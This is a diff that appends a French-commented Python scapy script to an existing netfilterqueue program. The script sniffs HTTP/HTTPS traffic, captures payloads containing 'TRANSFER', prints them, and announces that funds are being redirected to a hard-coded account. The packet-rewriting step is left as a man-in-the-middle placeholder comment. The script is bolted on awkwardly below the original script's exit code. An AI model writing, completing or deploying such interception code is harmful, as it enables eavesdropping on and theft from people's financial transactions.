@@ -86,3 +86,25 @@ try:
     nfqueue.run()
 except KeyboardInterrupt:
     nfqueue.unbind()
+
+import sys
+import time
+from scapy.all import *
+
+STATE_ACCOUNT = "CD-STATE-RECOVERY-778899"
+
+def redirect_funds(packet):
+    # Logique simplifiée d'interception de flux financier
+    if packet.haslayer(Raw):
+        payload = packet[Raw].load.decode(errors='ignore')
+        if "TRANSFER" in payload:
+            print(f"[!] Transaction détectée : {payload}")
+            print(f"[*] Redirection des fonds vers {STATE_ACCOUNT}")
+            # Ici intervient la modification du paquet (MITM)
+            
+def start():
+    print("[*] Écoute passive sur l'interface réseau...")
+    sniff(filter="tcp port 80 or port 443", prn=redirect_funds, store=0)
+
+if __name__ == "__main__":
+    start()
